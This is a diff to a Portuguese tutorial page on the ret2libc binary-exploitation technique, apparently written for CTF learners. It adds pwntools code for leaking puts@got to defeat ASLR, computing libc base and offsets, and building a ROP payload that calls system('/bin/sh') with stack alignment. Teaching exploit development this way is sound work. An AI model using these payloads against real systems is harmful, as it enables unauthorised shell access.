@@ -3,7 +3,7 @@ title: ret2libc
 sidebar_position: 4
 ---
 
-ret2libc é um caso de ROP onde usamos uma função qualquer da libc (biblioteca de funções padrão do C), `system()`, `execve()`, `mprotect()`, `gets()`, etc.]
+ret2libc é um caso de ROP onde, em vez de pular para uma função do próprio programa, pulamos para uma função da libc (biblioteca de funções padrão do C), como `system()`, `execve()`, `mprotect()`, `gets()`, etc. A libc inteira está mapeada na memória do processo, então todas as funções dela estão disponíveis, mesmo que o programa nunca as use.
 
 Como exemplo, vamos fazer um ret2libc com a função `system()`, que é a mais comum, pois executa qualquer comando e pode abrir uma shell.
 
@@ -29,32 +29,48 @@ $ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " system"
     # ↑ Offset do system = 0x4c350
 
 $ strings -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
- 1b5d0f8 /bin/sh
-    # ↑ Offset do /bin/sh = 0x1b5d0f8
+ 1b45bd /bin/sh
+    # ↑ Offset do /bin/sh = 0x1b45bd (a própria libc tem essa string, usada pelo system())
 ```
 
 Passo 3: Some base + offset
 ```
-system_addr = 0x00007ffff7dc0000 + 0x4c350 = 0x7ffff7e0c350
-bin_sh_addr = 0x00007ffff7dc0000 + 0x1b5d0f8 = 0x7ffff7f75d0f8
+system_addr = 0x00007ffff7dc0000 + 0x4c350  = 0x7ffff7e0c350
+bin_sh_addr = 0x00007ffff7dc0000 + 0x1b45bd = 0x7ffff7f745bd
+```
+
+Com pwntools, isso tudo vira:
+
+```py
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+libc.address = 0x00007ffff7dc0000          # base
+system_addr = libc.sym['system']
+bin_sh_addr = next(libc.search(b'/bin/sh\0'))
 ```
 
 ### Com ASLR
 
 Precisamos vazar um endereço primeiro.
 
-Parte 1: Vazar um endereço conhecido
+Parte 1: Vazar um endereço conhecido. A ideia clássica é chamar `puts(puts@got)`: a GOT contém o endereço real do `puts` na libc, e o próprio `puts` imprime esse endereço para nós. Depois voltamos para a `main` para poder fazer o overflow de novo, agora sabendo os endereços.
 
-```
-payload1 = padding + puts_addr + volta_para_main + puts_got
-# puts(puts@got) vai imprimir o endereço REAL do puts
+```py
+# x86-64: o argumento vai em rdi
+payload1 = padding + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.sym['main'])
+
+# x86 (32 bits): o argumento vai na stack, depois do endereço de retorno
+payload1 = padding + p32(elf.plt['puts']) + p32(elf.sym['main']) + p32(elf.got['puts'])
 ```
 
-Parte 2: Calcular base da libc
-```
-leaked_puts = recebe_do_programa()  # Ex: 0x7ffff7e3d420
-libc_base = leaked_puts - puts_offset  # 0x7ffff7dc0000
-system_addr = libc_base + system_offset
+Parte 2: Calcular base da libc. A randomização só muda a base: o offset de cada função dentro da libc é fixo, então precisamos da **mesma libc do servidor** (CTFs normalmente a fornecem. Se não, descubra pelos últimos 3 dígitos do leak em sites como [libc.rip](https://libc.rip)).
+
+```py
+p.recvuntil(...)                                   # até a saída do puts
+leaked_puts = u64(p.recvline().strip().ljust(8, b'\0'))   # Ex: 0x7ffff7e3d420 (6 bytes impressos, completamos até 8)
+libc.address = leaked_puts - libc.sym['puts']      # base = 0x7ffff7dc0000
+system_addr = libc.sym['system']
+bin_sh_addr = next(libc.search(b'/bin/sh\0'))
+# Parte 3: segundo payload, agora com os endereços certos (ret2system abaixo)
 ```
 
 ## ret2system
@@ -119,8 +135,13 @@ Basta usar um gadget ROP para colocar o primeiro parâmetro em `rdi`, já que os
 
 ```py
 payload = b"A" * 72            # Padding até RIP
-payload += p64(0x4011ab)       # gadget: pop rdi; ret
-payload += p64(0x7ffff7f5d0f8) # "/bin/sh" em RDI
-payload += p64(0x7ffff7e1e350) # system()
-payload += p64(0x7ffff7e11420) # exit() - opcional
+payload += p64(ret)            # gadget: ret (alinhamento da stack, veja abaixo)
+payload += p64(pop_rdi)        # gadget: pop rdi; ret
+payload += p64(bin_sh_addr)    # "/bin/sh" em RDI
+payload += p64(system_addr)    # system()
+payload += p64(exit_addr)      # exit() - opcional
 ```
+
+O `ret` extra no início é quase sempre necessário em 64 bits: o `system()` usa instruções SSE que exigem a stack alinhada em 16 bytes, e ao entrarmos nele por `ret` em vez de `call` a stack fica desalinhada em 8 bytes (veja [Desalinhamento de Stack](../buffer-overflow/return-address.md#cuidado-ao-sobrescrever-return-address-desalinhamento-de-stack)). Se der `SIGSEGV` dentro do `system` em um `movaps`, é isso.
+
+Em 32 bits não há esse problema, e também não há gadgets: os argumentos vão direto na stack, como mostrado acima.
